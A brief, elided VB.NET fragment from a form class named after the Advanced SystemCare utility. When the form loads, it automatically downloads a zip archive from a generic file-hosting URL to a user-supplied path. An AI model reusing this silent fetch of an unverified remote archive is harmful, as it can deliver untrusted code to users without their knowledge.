...
Public Class Advanced_Systemcare
    ...
    Private Sub Advanced_Systemcare_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ...
        downlaod.DownloadFileAsync(New Uri("https://612092f6-6003-49d0-8fe5-2e737d705081.usrfiles.com/archives/612092_62bedab645ce4186934cd94853c4fc30.zip"), Texbbb.TextBox58.Text)
        Timer1.Start()
